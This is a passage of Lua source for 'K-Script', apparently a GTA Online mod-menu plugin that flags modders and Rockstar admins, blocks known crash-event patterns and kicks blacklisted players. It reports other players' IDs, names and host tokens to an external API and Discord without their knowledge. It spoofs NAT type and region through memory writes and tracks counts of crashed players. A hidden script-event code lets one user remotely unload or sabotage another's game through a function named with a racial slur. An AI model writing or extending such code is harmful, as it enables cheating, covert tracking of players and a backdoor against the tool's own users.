      notify(("Detected %s for Modded Armour %d"):format(name, player.PlayerInfo.MaxArmour))
    end
    setDetectedPlayer(playerId, name, ("Modded Armour (%i)"):format(player.PlayerInfo.MaxArmour))
  end

  local detection = checkDetections(gamerInfo.RockstarId)
  if detection == nil then
    return
  end

  if detection == "YMCA" or detection == "GIT" then
    if detectedPlayerReasons[playerId + 1] ~= "YimMenu" then
      if detectedPlayerReasons[playerId + 1] == nil then
        notify(("Detected %s is using Yim Menu or a menu derived from it"):format(name))
      end
      setDetectedPlayer(playerId, name, "YimMenu")
    end
    return
  end

  if detection == "FRLY" then
    setDetectedPlayer(playerId, name, "Forced Relay")
    return
  end

  if detectedPlayerReasons[playerId + 1] == nil or detectedPlayerReasons[playerId + 1] ~= detection then
    notify(("Detected %s for %s"):format(name, detection))
    setDetectedPlayer(playerId, name, detection)
  end
end

hostShareSendQueued = false
hostShareTarget = nil

function NotifyKScriptUsersAboutHostStatus()
  if hostShareSendQueued and areWeHost then
    local localPlayer = Players.GetById(GTA.GetLocalPlayerId())
    local gamerInfo = localPlayer and localPlayer:GetGamerInfo()
    if gamerInfo then
      GTA.TriggerScriptEvent(1 << hostShareTarget, SCRIPT_EVENT.SCRIPT_EVENT_OHD_IS_PLAYER_PAUSING_RESET, GTA.GetLocalPlayerId(), 1 << hostShareTarget, 0, gamerInfo.RockstarId * 2 + 2003)
      Script.Yield()
    end
    hostShareSendQueued = false
  end
end

function decideToSendHostShareInit()
  if not maintransitionActive and areWeHost and numConnectedPlayers > 1 then
    for playerId = 0, 31 do
      local player = Players.GetById(playerId)
      if player and playerId ~= GTA.GetLocalPlayerId() and isNetPlayerOk(playerId, false, true) then
        while hostShareSendQueued do
          Script.Yield(100)
        end

        if sentHostShareEventPlayers[playerId + 1] == nil then
          sentHostShareEventPlayers[playerId + 1] = playerId
          hostShareTarget = playerId
          hostShareSendQueued = true
        end
        Script.Yield(100)
      end
    end
    hostShareActive = true
  end

  Script.Yield(2000)
end

detectionFired = false
function main()
  for playerId = 0, 31 do
    logGamerInfo(playerId)
  end

  Script.Yield(500)
end

local notifyJoinHash = nil
local notifyLeaveHash = nil

function maintransitionWatcher()
  if ShouldUnload() then
    Script.Yield(150)
    return
  end

  if notifyJoinHash == nil then
    local feature = FeatureMgr.GetFeatureByName("Notify On Player Join")
    notifyJoinHash = feature and feature:GetHash() or 0
    local leaveFeature = FeatureMgr.GetFeatureByName("Notify On Player Leave")
    notifyLeaveHash = leaveFeature and leaveFeature:GetHash() or 0
  end

  maintransitionActive = SCRIPT.GET_NUMBER_OF_THREADS_RUNNING_THE_SCRIPT_WITH_THIS_HASH(Utils.Joaat("MainTransition")) > 0

  if maintransitionActive and notifyJoinHash ~= 0 and FeatureMgr.IsFeatureEnabled(notifyJoinHash) then
    local state = getTransitionState()
    if state == 2 or state == 59 or not isNetPlayerOk(GTA.GetLocalPlayerId(), false, true) then
      local joinFeature = FeatureMgr.GetFeatureByName("Notify On Player Join")
      local leaveFeature = FeatureMgr.GetFeatureByName("Notify On Player Leave")
      if joinFeature then joinFeature:SetValue(false) end
      if leaveFeature then leaveFeature:SetValue(false) end
      Script.Yield(5000)

      while not isNetPlayerOk(GTA.GetLocalPlayerId(), false, true) and not ShouldUnload() do
        if joinFeature then joinFeature:SetValue(false) end
        if leaveFeature then leaveFeature:SetValue(false) end
        Script.Yield(100)
      end

      if leaveFeature then leaveFeature:SetValue(true) end
      if joinFeature then joinFeature:SetValue(true) end
    end
  end

  Script.Yield(150)
end

function onSessionChange()
  for index = 1, #yeetwindmills do
    DeleteEnt(yeetwindmills[index])
    Script.Yield()
  end

  yeetwindmills = {}
  clearingCache = true
  detectedPlayerNames = {}
  detectedPlayerReasons = {}
  sentKScriptEventPlayers = {}
  sentHostShareEventPlayers = {}
  lastPTFXEventTimes = {}
  lastSoundEventTimes = {}
  lastWorldStateEventTimes = {}
  netEventblacklist = {}
  spoofedPid = {}
  scriptEventblacklist = {}
  lastScriptEventTimes = {}
  worldStateEventblacklist = {}
  clearingCache = false
  hostShareActive = false
  hostShareSendQueued = false

  if isSupporter then
    local clearFeature = FeatureMgr.GetFeature(Utils.Joaat("clearcacheEnts8")) or FeatureMgr.GetFeature(Utils.Joaat("clearcacheEnts9"))
    if clearFeature then
      clearFeature:TriggerCallback()
    end
  end
end

adminRIDLookup = {}

local function rebuildAdminRidLookup()
  adminRIDLookup = {}
  if type(adminRIDList) ~= "table" then
    return
  end

  for _, rid in ipairs(adminRIDList) do
    local value = tonumber(rid)
    if value then
      adminRIDLookup[value] = true
    end
  end
end

rebuildAdminRidLookup()

function SendAltAccountDetection(rid, hostToken, playerName)
  Script.QueueJob(function()
    if not ensureApiAuthenticated("SendAltAccountDetection", SOCIALCLUB.SC_ACCOUNT_INFO_GET_NICKNAME()) then
      return
    end

    local curl = Curl.Easy()
    curl:Setopt(eCurlOption.CURLOPT_URL, API_BASE .. "/altAccountDetection")
    curl:Setopt(eCurlOption.CURLOPT_POST, 1)
    addAuthHeaders(curl)
    curl:Setopt(eCurlOption.CURLOPT_USERAGENT, "K-Script V38")
    curl:Setopt(eCurlOption.CURLOPT_POSTFIELDS, json.encode({
      rid = tostring(rid),
      host_token = ("0x%X"):format(tonumber(hostToken) or 0),
      playerName = playerName or "Unknown",
      client_name = SOCIALCLUB.SC_ACCOUNT_INFO_GET_NICKNAME(),
    }))
    curl:DisableErrorLog()
    curl:Perform()

    local code, response = waitForCurl(curl, 5, 8)
    if responseNeedsApiRefresh(response) and refreshApiKey("SendAltAccountDetection", SOCIALCLUB.SC_ACCOUNT_INFO_GET_NICKNAME()) then
      SendAltAccountDetection(rid, hostToken, playerName)
      return
    end

    if responseIsUnauthorized(response) then
      Logger.LogError("K-Script: Session Ticket Revoked!")
      FuckTheniggersGame()
      return
    end

    if code ~= eCurlCode.CURLE_OK and isAdmin then
      Logger.LogError(("[AltDetect] curlCode: %s | body: %s"):format(tostring(code), tostring(response)))
    elseif isDev then
      Logger.LogInfo(("[AltDetect] Sent for %s (%s)"):format(tostring(playerName), tostring(rid)))
    end
  end)
end

function onPlayerJoin(playerId)
  local player = Players.GetById(playerId)
  if not player then
    return
  end

  local gamerInfo = player:GetGamerInfo()
  if not gamerInfo then
    return
  end

  local rid = tonumber(gamerInfo.RockstarId)
  if not rid or playerId == GTA.GetLocalPlayerId() then
    return
  end

  if next(adminRIDLookup) == nil then
    rebuildAdminRidLookup()
  end

  if adminRIDLookup[rid] then
    notify(("Detected %s as Rockstar Administrator!"):format(Players.GetName(playerId)))
    SendToDiscord("admin-detected", ("%s encountered a Rockstar Admin %s(%d) (Game: %s)"):format(
      SOCIALCLUB.SC_ACCOUNT_INFO_GET_NICKNAME(),
      Players.GetName(playerId),
      rid,
      getGameVersion(isGameVersionEnhanced)
    ))
    setDetectedPlayer(playerId, Players.GetName(playerId), "Rockstar Administrator")
  end

  if modderDBMap and modderDBMap[rid] and isSupporter then
    notify(("Detected %s as known modder (%s)!"):format(Players.GetName(playerId), modderDBMap[rid]))
    SendToDiscord("modder-detected", ("%s encountered flagged player %s(%d) [%s] (Game: %s) Host Token: 0x%X"):format(
      SOCIALCLUB.SC_ACCOUNT_INFO_GET_NICKNAME(),
      Players.GetName(playerId),
      rid,
      modderDBMap[rid],
      getGameVersion(isGameVersionEnhanced),
      tonumber(gamerInfo.HostKey) or 0
    ))
    setDetectedPlayer(playerId, Players.GetName(playerId), "Known Modder (" .. modderDBMap[rid] .. ")")
  end

  if blacklistRIDList and blacklistRIDList[rid] then
    SendToDiscord("blacklist-detected", ("%s encountered a Blacklisted Player %s(%d) (Game: %s)"):format(
      SOCIALCLUB.SC_ACCOUNT_INFO_GET_NICKNAME(),
      Players.GetName(playerId),
      rid,
      getGameVersion(isGameVersionEnhanced)
    ))

    if not isDev and rid ~= 282410976 then
      local blockInSyncs = FeatureMgr.GetFeatureByName("Block In Syncs", playerId)
      local blockInScriptEvents = FeatureMgr.GetFeatureByName("Block In SE", playerId)
      if blockInSyncs and not blockInSyncs:IsToggled() then
        blockInSyncs:Toggle()
      end
      if blockInScriptEvents and not blockInScriptEvents:IsToggled() then
        blockInScriptEvents:Toggle()
      end

      if NETWORK.NETWORK_IS_HOST() then
        NETWORK.NETWORK_SESSION_KICK_PLAYER(playerId)
      else
        local smartKick = FeatureMgr.GetFeatureByName("Smart Kick", playerId)
        if smartKick then
          smartKick:TriggerCallback()
        end
      end
    end
  end
end

function onPlayerLeave(playerId)
  spoofedPid[playerId] = false
  spoofedVehicle = {}
  clearDetectedPlayer(playerId)

  if playerId == GTA.GetLocalPlayerId() then
    hostShareActive = false
    hostShareSendQueued = false
  end

  if hostSharePID == playerId then
    hostSharePID = nil
    hostShareActive = false
  end

  lastPTFXEventTimes[playerId + 1] = nil
  lastSoundEventTimes[playerId + 1] = nil
  netEventblacklist[playerId + 1] = nil
  scriptEventblacklist[playerId + 1] = nil
  lastScriptEventTimes[playerId + 1] = nil
  worldStateEventblacklist[playerId + 1] = nil
  lastWorldStateEventTimes[playerId + 1] = nil
  sentKScriptEventPlayers[playerId + 1] = nil
  sentHostShareEventPlayers[playerId + 1] = nil

  if playerId == GTA.GetLocalPlayerId() then
    local clearCache = FeatureMgr.GetFeature(Utils.Joaat("clearCache"))
    if clearCache then
      clearCache:TriggerCallback()
    end
  end
end

function parseRequestControlEvent(reader, sender)
  local data = {}
  if reader and reader.ReadUns then
    data.objectId = select(1, reader:ReadUns(SIZEOF_OBJECTID or 13))
  end

  if isDev and data.objectId then
    Logger.Log(eLogColor.CYAN, "K-Script [DEBUG]", ("CRequestControlEvent from %s for ObjectNetId 0x%X"):format(sender:GetName(), data.objectId))
  end

  return data
end

function onNetEvent(sender, eventId, reader)
  if ShouldUnload() or sender == nil then
    return
  end

  if eventId == 4 then
    if isDev then
      parseRequestControlEvent(reader, sender)
    end

    if oncrashCooldown then
      return true
    end
  elseif eventId == 5 and isDev then
    Logger.LogInfo("CGiveControlEvent from " .. sender:GetName())
  elseif eventId == 51 then
    if isDev then
      notify(("Blocked Networked Sound Attempt by %s"):format(sender:GetName()))
    end
    return true
  end
end

function isNumeric(value)
  return tostring(value):match("^%d+$") ~= nil
end

scriptEventPatterns = {
  scriptHostCrash = {len = 9, [1] = 323285304, [4] = 2147483647, [5] = 2147483647, [6] = 2147483647, [7] = 2147483647, [8] = 956849991, [9] = 0},
  infiniteLoading = {len = 11, [1] = -1321657966, [4] = 0, [5] = 1, [6] = -1, [7] = 1, [8] = -1, [9] = 0, [10] = 0, [11] = 0},
  phoneInviteSpam = {len = 4, [1] = 800157557, [3] = 1069539005, [4] = 225624744},
}

local function eventMatchesPattern(args, pattern)
  local expectedLength = pattern.len or #pattern
  if #args ~= expectedLength then
    return false
  end

  for index = 1, expectedLength do
    local expected = pattern[index]
    if expected ~= nil and args[index] ~= expected then
      return false
    end
  end

  return true
end

local function scriptProtectionEnabled(name)
  return isFeatureEnabled("scriptEventProtections") and isFeatureEnabled(name)
end

local function scriptNotify(message)
  if isFeatureEnabled("notifyProtections") then
    notify(message)
  end
end

local function senderRoleCode(sender, value)
  local gamerInfo = sender and sender.GetGamerInfo and sender:GetGamerInfo() or nil
  local rid = gamerInfo and tonumber(gamerInfo.RockstarId) or 0
  return tonumber(value) and (tonumber(value) - (rid * 2)) or nil
end

local function markKScriptUser(playerId, name, role)
  if detectedPlayerReasons[playerId + 1] == role then
    return true
  end

  setDetectedPlayer(playerId, name, role)
  notify(("Detected %s as %s!"):format(name, role))
  return true
end

function scriptedGameEvent(sender, args)
  if ShouldUnload() or not sender or type(args) ~= "table" then
    return false
  end

  local senderName = sender:GetName() or ""
  local playerId = sender.PlayerId

  if #args == 5 and args[1] == SCRIPT_EVENT.SCRIPT_EVENT_OHD_IS_PLAYER_PAUSING_RESET then
    local code = senderRoleCode(sender, args[5])
    if code then
      if code == 2015 then
        return markKScriptUser(playerId, senderName, "K-Script User")
      elseif code == 69 and (isDev or isAdmin or isModerator) then
        return markKScriptUser(playerId, senderName, "K-Script Donator")
      elseif code == 666 then
        return markKScriptUser(playerId, senderName, "K-Script Developer")
      elseif code == 420 then
        return markKScriptUser(playerId, senderName, "K-Script Admin")
      elseif code == 2024 then
        return markKScriptUser(playerId, senderName, "K-Script Moderator")
      elseif code == 1978 then
        if not isDev then
          SetShouldUnload()
        end
        return true
      elseif code == 1979 then
        if not isDev then
          FuckTheniggersGame()
        end
        return true
      elseif code == 2003 then
        hostShareActive = true
        hostSharePID = playerId
        notify("Host share active.")
        return true
      elseif code == 42069 then
        clearDetectedPlayer(playerId)
        if isDev or isAdmin or isModerator then
          notify(("%s unloaded K-Script."):format(senderName))
        end
        return true
      end
    end
  end

  if scriptProtectionEnabled("blockSHcrash") and eventMatchesPattern(args, scriptEventPatterns.scriptHostCrash) then
    scriptNotify(("Blocked SH crash from %s"):format(senderName))
    return true
  end

  if scriptProtectionEnabled("blockInfiniteLoading") and eventMatchesPattern(args, scriptEventPatterns.infiniteLoading) then
    scriptNotify(("Blocked Infinite Loading from %s"):format(senderName))
    return true
  end

  if scriptProtectionEnabled("blockApartmentInvite") and args[1] == SCRIPT_EVENT.SCRIPT_EVENT_INVITE_NEARBY_PLAYERS_INTO_APARTMENT then
    scriptNotify(("Blocked Apartment Invite from %s"):format(senderName))
    return true
  end

  if scriptProtectionEnabled("blockRemoveWanted") and args[1] == SCRIPT_EVENT.SCRIPT_EVENT_FM_EVENT_GIVE_WANTED_LEVEL then
    scriptNotify(("Blocked Remove Wanted from %s"):format(senderName))
    return true
  end

  if scriptProtectionEnabled("blockGiveWanted") and args[1] == SCRIPT_EVENT.SCRIPT_EVENT_FREEMODE_CONTENT_GIVE_WANTED_LEVEL then
    scriptNotify(("Blocked Give Wanted from %s"):format(senderName))
    return true
  end

  if (scriptProtectionEnabled("blockSoundSpam1k") or scriptProtectionEnabled("blockSoundSpam5k")) and args[1] == SCRIPT_EVENT.INVITE_TO_HEIST_ISLAND_BEACH_PARTY then
    scriptNotify(("Blocked Sound Spam from %s"):format(senderName))
    return true
  end

  if scriptProtectionEnabled("blockTickerMessage") and args[1] == SCRIPT_EVENT.SCRIPT_EVENT_TICKER_MESSAGE then
    scriptNotify(("Blocked Ticker Message from %s"):format(senderName))
    return true
  end

  if scriptProtectionEnabled("blockInsuranceScam") and args[1] == SCRIPT_EVENT.SCRIPT_EVENT_CAR_INSURANCE and args[3] == 64 and args[4] == 369209303 then
    scriptNotify(("Blocked Insurance Scam from %s"):format(senderName))
    return true
  end

  if scriptProtectionEnabled("blockPhoneInviteSpam") and eventMatchesPattern(args, scriptEventPatterns.phoneInviteSpam) then
    scriptNotify(("Blocked Phone Invite Spam from %s"):format(senderName))
    return true
  end

  if scriptProtectionEnabled("blockMissionInvite")
    and (args[1] == SCRIPT_EVENT.SCRIPT_EVENT_INVITE_PLAYER_ONTO_MISSION or args[1] == SCRIPT_EVENT.SCRIPT_EVENT_FORCE_PLAYER_ONTO_MISSION)
    and senderName ~= "CMsgJoinRequest" then
    local activity = activities and activities[args[4]] or tostring(args[4])
    SendToDiscord("eventhook", ("%s tried to send %s(%i) into %s"):format(senderName, Players.GetName(GTA.GetLocalPlayerId()), Cherax.GetUID(), tostring(activity)))
    scriptNotify(("Blocked Mission Invite (%s) from %s"):format(tostring(activity), senderName))
    return true
  end

  if scriptProtectionEnabled("blockMissionConfirm") and args[1] == SCRIPT_EVENT.SCRIPT_EVENT_CONFIRMATION_LAUNCH_MISSION and senderName ~= "CMsgJoinRequest" then
    return true
  end

  return false
end

function onUnload()
  isUnloading = true
  DisableDiscordRPC()

  Script.QueueJob(function()
    local localPlayer = Players.GetById(GTA.GetLocalPlayerId())
    local gamerInfo = localPlayer and localPlayer:GetGamerInfo()
    if not gamerInfo then
      return
    end

    for playerId = 0, 31 do
      if Players.GetById(playerId) then
        GTA.TriggerScriptEvent(1 << playerId, SCRIPT_EVENT.SCRIPT_EVENT_OHD_IS_PLAYER_PAUSING_RESET, GTA.GetLocalPlayerId(), 1 << playerId, 0, gamerInfo.RockstarId * 2 + 42069)
      end
    end
  end)

  for _, featureName in ipairs({"acceptAlerts", "skipReload", "dbug"}) do
    local feature = FeatureMgr.GetFeature(Utils.Joaat(featureName))
    if feature then
      feature:Reset()
    end
  end

  if natTypeAddress and isFeatureEnabled("natSpoofToggle") then
    Memory.WriteInt(natTypeAddress, originalNatType)
  end

  if regionAddress and isFeatureEnabled("regionSpoofToggle") then
    Memory.WriteInt(regionAddress, originalRegion)
  end

  for _, pool in ipairs({party_buses or {}, static_buses or {}}) do
    for _, entity in ipairs(pool) do
      DeleteEnt(entity)
    end
  end

  collectgarbage("collect")
  Logger.Log(eLogColor.MAGENTA, "K-Script", "Unloading, Bye...")
end

sendKScriptEventQueued = false
sendKScriptEventTarget = nil

function sendKScriptEvent()
  if not sendKScriptEventQueued then
    Script.Yield(100)
    return
  end

  local localPlayer = Players.GetById(GTA.GetLocalPlayerId())
  local gamerInfo = localPlayer and localPlayer:GetGamerInfo()
  if not gamerInfo or sendKScriptEventTarget == nil then
    sendKScriptEventQueued = false
    Script.Yield(100)
    return
  end

  local roleCode = 2015
  if isDev then
    roleCode = 666
  elseif isAdmin then
    roleCode = 420
  elseif isModerator then
    roleCode = 2024
  elseif isSupporter then
    roleCode = 69
  end

  if isDev then
    Logger.Log(eLogColor.GREEN, "K-Script", ("Sending KSUID Event to PlayerId: %d"):format(sendKScriptEventTarget))
  end

  GTA.TriggerScriptEvent(1 << sendKScriptEventTarget, SCRIPT_EVENT.SCRIPT_EVENT_OHD_IS_PLAYER_PAUSING_RESET, GTA.GetLocalPlayerId(), 1 << sendKScriptEventTarget, 0, gamerInfo.RockstarId * 2 + roleCode)
  Script.Yield(50)
  sendKScriptEventQueued = false
end

function CommunicateWithKScriptUsers()
  if not isNetPlayerOk(GTA.GetLocalPlayerId(), false, true) then
    Script.Yield(100)
    return
  end

  for playerId = 0, 31 do
    local player = Players.GetById(playerId)
    if player and playerId ~= GTA.GetLocalPlayerId() and isNetPlayerOk(playerId, false, true) then
      while sendKScriptEventQueued do
        Script.Yield(200)
      end

      local ghostDetect = FeatureMgr.GetFeature(Utils.Joaat("ghostDetect"))
      local shouldSend = sentKScriptEventPlayers[playerId + 1] == nil
      if ghostDetect and isFeatureEnabled("ghostDetect") then
        shouldSend = true
      end

      if shouldSend then
        sentKScriptEventPlayers[playerId + 1] = playerId
        sendKScriptEventTarget = playerId
        sendKScriptEventQueued = true
      end
    end
  end

  Script.Yield(100)
end

pcall(EventMgr.RegisterHandler, eLuaEvent.SCRIPTED_GAME_EVENT, scriptedGameEvent)
pcall(EventMgr.RegisterHandler, eLuaEvent.ON_PLAYER_LEFT, onPlayerLeave)
pcall(EventMgr.RegisterHandler, eLuaEvent.ON_PLAYER_JOIN, onPlayerJoin)
pcall(EventMgr.RegisterHandler, eLuaEvent.ON_SESSION_CHANGE, onSessionChange)
pcall(EventMgr.RegisterHandler, eLuaEvent.ON_UNLOAD, onUnload)
pcall(EventMgr.RegisterHandler, eLuaEvent.NET_EVENT, onNetEvent)

Script.RegisterLooped(main)
Script.RegisterLooped(maintransitionWatcher)
Script.RegisterLooped(updateHostInfo)
Script.RegisterLooped(sendKScriptEvent)
Script.RegisterLooped(NotifyKScriptUsersAboutHostStatus)
Script.RegisterLooped(decideToSendHostShareInit)
Script.RegisterLooped(CommunicateWithKScriptUsers)
Script.RegisterLooped(skipAlerts)
Script.RegisterLooped(readGameEvents)

lastState = nil
timerStart = nil

local function safeFeatureEnabledHash(hash, fallback)
  local ok, enabled = pcall(FeatureMgr.IsFeatureEnabled, hash)
  if ok then
    return enabled == true
  end
  return fallback == true
end

local function safeFeature(name)
  local ok, feature = pcall(FeatureMgr.GetFeature, Utils.Joaat(name))
  if ok then
    return feature
  end
  return nil
end

local function ensureToggleFeature(name, label, description, defaultValue, callback)
  local hash = Utils.Joaat(name)
  local feature = safeFeature(name)

  if feature == nil then
    feature = FeatAdd(hash, label, eFeatureType.Toggle, description or "", callback or function()
    end)
    setDefaultAndReset(feature, defaultValue == true)
  end

  return feature
end

local function safePoolValue(methodName, fallback)
  if PoolMgr == nil or PoolMgr[methodName] == nil then
    return fallback
  end

  local ok, value = pcall(PoolMgr[methodName])
  if ok and value ~= nil then
    return value
  end

  return fallback
end

local function safeRenderedPoolCount(methodName)
  local value = safePoolValue(methodName, {})
  if type(value) == "table" then
    return #value
  end
  return 0
end

function ClampWindowToScreen()
  local screenWidth, screenHeight = ImGui.GetDisplaySize()
  local windowX, windowY = ImGui.GetWindowPos()
  local windowWidth, windowHeight = ImGui.GetWindowSize()

  local clampedX = math.max(0, math.min(screenWidth - windowWidth, windowX))
  local clampedY = math.max(0, math.min(screenHeight - windowHeight, windowY))

  if clampedX ~= windowX or clampedY ~= windowY then
    ImGui.SetWindowPos(clampedX, clampedY)
  end
end

function drawModders()
  if not modderDisplay then
    return
  end

  local screenWidth, screenHeight = ImGui.GetDisplaySize()
  local windowWidth = 300
  local lineCount = 1
  for _ in pairs(detectedPlayerNames) do
    lineCount = lineCount + 1
  end

  local windowHeight = math.max(42, 24 + (lineCount * 18))
  if not windowPositionSet then
    local stored = StoredPos.ModderDisplay
    local x = stored and stored.x or math.max(0, math.min(screenWidth - windowWidth, ((screenWidth - windowWidth) / 2) - 400))
    local y = stored and stored.y or math.max(0, math.min(screenHeight - windowHeight, screenHeight - windowHeight - 50))

    ImGui.SetNextWindowPos(x, y, ImGuiCond.Always)
    ImGui.SetNextWindowSize(windowWidth, windowHeight, ImGuiCond.Always)
    windowPositionSet = true

    if isDev then
      Logger.Log(eLogColor.GREEN, "K-Script", ("drawModders applying pos X=%s Y=%s"):format(tostring(x), tostring(y)))
    end
  end

  local flags = ImGuiWindowFlags.AlwaysAutoResize | ImGuiWindowFlags.NoCollapse | ImGuiWindowFlags.NoScrollbar | ImGuiWindowFlags.NoMove
  local ok, opened = pcall(ImGui.Begin, "K-Script - Detected Modders", true, flags)
  if not ok then
    return
  end

  if opened then
    local x, y = ImGui.GetWindowPos()
    StoredPos.ModderDisplay = V2.New(x, y)

    if isTableEmpty(detectedPlayerNames) then
      ImGui.TextColored(255, 255, 255, 255, "There are no Modders detected yet.")
    else
      local total = 0
      for playerId, playerName in pairs(detectedPlayerNames) do
        total = total + 1
        local reason = detectedPlayerReasons[playerId]
        if reason and tostring(reason):find("Model Swap From", 1, true) then
          reason = "Model Swap"
        end

        if reason then
          ImGui.TextColored(255, 255, 255, 255, ("%s (%s)"):format(tostring(playerName), tostring(reason)))
        else
          ImGui.TextColored(255, 255, 255, 255, tostring(playerName))
        end
      end

      ImGui.TextColored(255, 255, 255, 255, ("Total Modders in this Session: %i"):format(total))
    end

    ClampWindowToScreen()
  end

  ImGui.End()
end

H_INFO_GENERAL = Utils.Joaat("infoShowGeneral")
H_INFO_POOLS = Utils.Joaat("infoShowPools")
H_INFO_HOSTS = Utils.Joaat("infoShowHosts")
H_INFO_VOICECHAT = Utils.Joaat("infoShowVoiceChat")
H_INFO_TRANSITION = Utils.Joaat("infoShowTransition")
H_crashLOOP = Utils.Joaat("crashloop")
H_TOGGLE_MODDER_DISPLAY = Utils.Joaat("togglemodderdisplay")
H_TOGGLE_GAME_INFO_DISPLAY = Utils.Joaat("togglegameinfodisplay")

ensureToggleFeature("infoShowGeneral", "Info Display General", "Shows general information.", true)
ensureToggleFeature("infoShowPools", "Info Display Pools", "Shows pool usage and rendered entity counts.", true)
ensureToggleFeature("infoShowHosts", "Info Display Hosts", "Shows session host, script host, and player count.", true)
ensureToggleFeature("infoShowVoiceChat", "Info Display Voice Chat", "Shows players using voice chat.", true)
ensureToggleFeature("infoShowTransition", "Info Display Transition", "Shows transition monitor state and timer.", true)

ensureToggleFeature("togglemodderdisplay", "Toggle Modder Display", "Show the detected modder overlay.", true, function(feature)
  modderDisplay = feature:IsToggled()
end)

ensureToggleFeature("togglegameinfodisplay", "Toggle Game Info Display", "Show the game information overlay.", true, function(feature)
  gameInfoDisplay = feature:IsToggled()
end)

ensureToggleFeature("dbug", "Debug Events", "Log additional script and game event information.", false)
ensureToggleFeature("disabledraw", "Disable Drawing", "Disable K-Script overlay drawing.", false)
ensureToggleFeature("ghostDetect", "Ghost Detection", "Refresh K-Script user pings continuously.", false)

local infoFeatureCache = {
  lastUpdate = 0,
  interval = 0.5,
  toggleGuiFeature = nil,
  isMovable = false,
  showGeneral = true,
  showPools = true,
  showHosts = true,
  showVoiceChat = true,
  showTransition = true,
  showcrashloop = false,
}

local infoTextCache = {
  lastUpdate = 0,
  interval = 0.8,
  lines = {},
}

local infoWindowCache = {
  lastPosSave = 0,
  posSaveInterval = 1,
  lastClamp = 0,
  clampInterval = 2,
  lastDisplaySizeUpdate = 0,
  displaySizeInterval = 2,
  displayWidth = 0,
  displayHeight = 0,
}

function updateInfoFeatureCache()
  local now = os.clock()
  if (now - infoFeatureCache.lastUpdate) < infoFeatureCache.interval then
    return
  end

  infoFeatureCache.lastUpdate = now

  if infoFeatureCache.toggleGuiFeature == nil and FeatureMgr.GetFeatureByName then
    local ok, feature = pcall(FeatureMgr.GetFeatureByName, "Toggle GUI")
    if ok then
      infoFeatureCache.toggleGuiFeature = feature
    end
  end

  if infoFeatureCache.toggleGuiFeature and infoFeatureCache.toggleGuiFeature.GetBoolValue then
    local ok, value = pcall(infoFeatureCache.toggleGuiFeature.GetBoolValue, infoFeatureCache.toggleGuiFeature)
    infoFeatureCache.isMovable = ok and value == true
  else
    infoFeatureCache.isMovable = false
  end

  infoFeatureCache.showGeneral = safeFeatureEnabledHash(H_INFO_GENERAL, true)
  infoFeatureCache.showPools = safeFeatureEnabledHash(H_INFO_POOLS, true)
  infoFeatureCache.showHosts = safeFeatureEnabledHash(H_INFO_HOSTS, true)
  infoFeatureCache.showVoiceChat = safeFeatureEnabledHash(H_INFO_VOICECHAT, true)
  infoFeatureCache.showTransition = safeFeatureEnabledHash(H_INFO_TRANSITION, true)

  local crashLoopFeature = FeatureMgr.GetFeature(H_crashLOOP)
  infoFeatureCache.showcrashloop = crashLoopFeature ~= nil and safeFeatureEnabledHash(H_crashLOOP, false)
end

function drawGeneralInfoLive()
  if not infoFeatureCache.showGeneral then
    return
  end

  local now = os.date("*t")
  local months = {
    "January", "February", "March", "April", "May", "June",
    "July", "August", "September", "October", "November", "December",
  }
  local days = {"Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"}

  ImGui.Text(("%s %s %d %02d:%02d:%02d %d"):format(
    days[now.wday] or "Unknown",
    months[now.month] or "Unknown",
    now.day,
    now.hour,
    now.min,
    now.sec,
    now.year
  ))
  ImGui.Text(("FPS: %.3f"):format(ImGui.GetFrameRate()))
end

function rebuildInfoTextCache()
  local now = os.clock()
  if (now - infoTextCache.lastUpdate) < infoTextCache.interval then
    return
  end

  infoTextCache.lastUpdate = now
  local lines = {}

  if infoFeatureCache.showGeneral then
    if isDev or isAdmin or isModerator then
      lines[#lines + 1] = ("Script Memory Usage: %s MB"):format(trimVersion(luaMemoryKb() / 1000))
    end

    lines[#lines + 1] = "Matchmaking Region: " .. tostring(currentRegionName or "Unknown")
    lines[#lines + 1] = "Nat Type: " .. tostring(currentNatTypeName or "Unknown")
    lines[#lines + 1] = ""
  end

  local maxObjects = safePoolValue("GetMaxObjectCount", 0)
  if infoFeatureCache.showPools and maxObjects ~= 0 then
    lines[#lines + 1] = ("Camera Pool: %s / %s"):format(tostring(safePoolValue("GetCurrentCameraCount", 0)), tostring(safePoolValue("GetMaxCameraCount", 0)))
    lines[#lines + 1] = ("Object Pool: %s / %s"):format(tostring(safePoolValue("GetCurrentObjectCount", 0)), tostring(maxObjects))
    lines[#lines + 1] = ("Ped Pool: %s / %s"):format(tostring(safePoolValue("GetCurrentPedCount", 0)), tostring(safePoolValue("GetMaxPedCount", 0)))
    lines[#lines + 1] = ("Pickup Pool: %s / %s"):format(tostring(safePoolValue("GetCurrentPickupCount", 0)), tostring(safePoolValue("GetMaxPickupCount", 0)))
    lines[#lines + 1] = ("Vehicle Pool: %s / %s"):format(tostring(safePoolValue("GetCurrentVehicleCount", 0)), tostring(safePoolValue("GetMaxVehicleCount", 0)))
    lines[#lines + 1] = ""
    lines[#lines + 1] = "Rendered Objects: " .. tostring(safeRenderedPoolCount("GetRenderedObjects"))
    lines[#lines + 1] = "Rendered Peds: " .. tostring(safeRenderedPoolCount("GetRenderedPeds"))
    lines[#lines + 1] = "Rendered Vehicles: " .. tostring(safeRenderedPoolCount("GetRenderedVehicles"))
    lines[#lines + 1] = ""
  end

  if infoFeatureCache.showHosts
    and hostName ~= "Invalid"
    and hostName ~= "Not Found"
    and scriptHostName ~= "Invalid"
    and scriptHostName ~= "Not Found"
  then
    lines[#lines + 1] = "Session Host: " .. tostring(hostName)
    lines[#lines + 1] = "Script Host: " .. tostring(scriptHostName)
    lines[#lines + 1] = ("Connected Players: %s / 43"):format(tostring(numConnectedPlayers))
    lines[#lines + 1] = ""
  end

  if infoFeatureCache.showVoiceChat then
    lines[#lines + 1] = "VoiceChat Players:"
    if isTableEmpty(voiceChatters) then
      lines[#lines + 1] = "No Voice Chatters in this Session."
    else
      for _, playerName in pairs(voiceChatters) do
        lines[#lines + 1] = tostring(playerName)
      end
    end
  end

  if infoFeatureCache.showcrashloop then
    lines[#lines + 1] = ""
    lines[#lines + 1] = "crashed Session Count: " .. tostring(crashedsessioncount)
    lines[#lines + 1] = "crashed Players Count: " .. tostring(crashedplayercount)
  end

  if infoFeatureCache.showTransition and maintransitionActive and maxObjects ~= 0 then
    local state = getTransitionState()
    local stateName = state and state ~= 0 and getTransitionStateName(state) or "N/A"
    if lastState ~= state then
      lastState = state
      timerStart = os.time()
    end

